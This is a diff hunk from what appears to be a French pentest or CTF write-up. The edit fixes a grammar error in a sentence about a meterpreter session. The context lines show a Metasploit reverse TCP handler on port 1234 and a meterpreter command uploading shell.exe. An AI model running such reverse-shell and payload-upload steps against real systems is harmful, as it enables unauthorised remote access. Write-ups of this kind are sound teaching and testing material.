@@ -291,7 +291,7 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 0.0.0.0:1234 
 ```
 
-On créer un sessions de meterpreter qui écoute notre reverse shell.
+On créer une session de meterpreter qui écoute notre reverse shell.
 
 ```bash
 meterpreter > upload shell.exe
